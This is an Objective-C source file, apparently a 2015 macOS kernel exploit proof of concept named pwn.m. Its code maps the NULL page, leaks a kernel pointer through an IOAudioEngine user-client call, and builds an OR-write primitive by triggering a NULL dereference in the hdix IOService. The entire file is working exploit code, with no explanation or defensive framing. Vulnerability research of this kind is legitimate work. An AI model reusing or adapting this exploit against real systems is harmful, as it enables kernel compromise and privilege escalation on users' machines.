//
//  pwn.m
//  poc-1
//
//  Created by jndok on 15/11/15.
//  Copyright © 2015 jndok. All rights reserved.
//

#include "pwn.h"

extern io_service_t audio;
extern io_service_t hdix;

uint16_t alloc_null(vm_size_t size)
{
    kern_return_t kr;
    mach_vm_address_t null_map=0x0;
    vm_deallocate(mach_task_self(), 0x0, 0x1000);
    kr=mach_vm_allocate(mach_task_self(), &null_map, 0x1000, 0);
    if (kr != KERN_SUCCESS)
        return 1;
    return 0;
}

uint64_t io_audio_engine_infoleak(io_connect_t *conn)
{
    kern_return_t kr;
    kr=IOServiceOpen(audio, mach_task_self(), 0, conn);
    if (kr!=KERN_SUCCESS)
        return 1;
    
    uint64_t output;
    uint32_t output_cnt=1;
    IOConnectCallMethod(*conn, 2, NULL, 0, NULL, 0, &output, &output_cnt, NULL, 0);
    if (!output)
        return 2;
    
    return (output << 8) | 0xffffff0000000000;
}

/*
 volatile uint64_t *ptr=0x0;
 while ((uint32_t)ptr < 0xc00) {
 *ptr=address-0x162;
 ptr++;
 }
 */

uint16_t or_primitive(uint64_t address)
{
    enum codes {
        ERR_NULL_MAP_FAILED=1,
        ERR_KERN_NOT_VULNERABLE,
        ERR_OFFSET_INVALID
    };
    
#define LAND_AREA 0x800
    
    kern_return_t kr;
    io_iterator_t iter;
    io_connect_t conn = MACH_PORT_NULL;
    
    static uint32_t offset;
    
#define trigger() IOServiceOpen(hdix, kIOMasterPortDefault, 0, &conn); IOServiceClose(conn);
    
    assert(hdix!=MACH_PORT_NULL);
    
    mach_vm_address_t null_map=0x0;
    vm_deallocate(mach_task_self(), 0x0, 0x1000);
    kr=mach_vm_allocate(mach_task_self(), &null_map, 0x1000, 0);
    if (kr != KERN_SUCCESS)
        return ERR_NULL_MAP_FAILED;
    
    volatile uint64_t *fill=(uint64_t*)0x0;
    
    if (!offset) {
        while ((uint32_t)fill<LAND_AREA) {
            *fill=(uint64_t)LAND_AREA;
            ++fill;
        }
        trigger()
        
        char *ored=(char*)LAND_AREA;
        while ((uint32_t)ored<=0x1000) {
            if (*ored==0x10) {
                break;
            }
            if ((uint32_t)ored == 0x1000)
                return ERR_KERN_NOT_VULNERABLE;
            ++ored;
        }
        
        offset=(uint32_t)ored-(uint32_t)LAND_AREA;
        
        fill=(uint64_t*)0x0;
        while ((uint32_t)fill<LAND_AREA) {
            *fill=(uint64_t)(LAND_AREA-(uint64_t)offset);
            ++fill;
        }
        trigger()
        
        if (*(uint64_t*)LAND_AREA != 0x10) {
            return ERR_OFFSET_INVALID;
        }
        
    }
    
    fill=(uint64_t*)0x0;
    while ((uint32_t)fill<LAND_AREA) {
        *fill=(uint64_t)(address-(uint64_t)offset);
        ++fill;
    }
    trigger()
    
    return 0;
}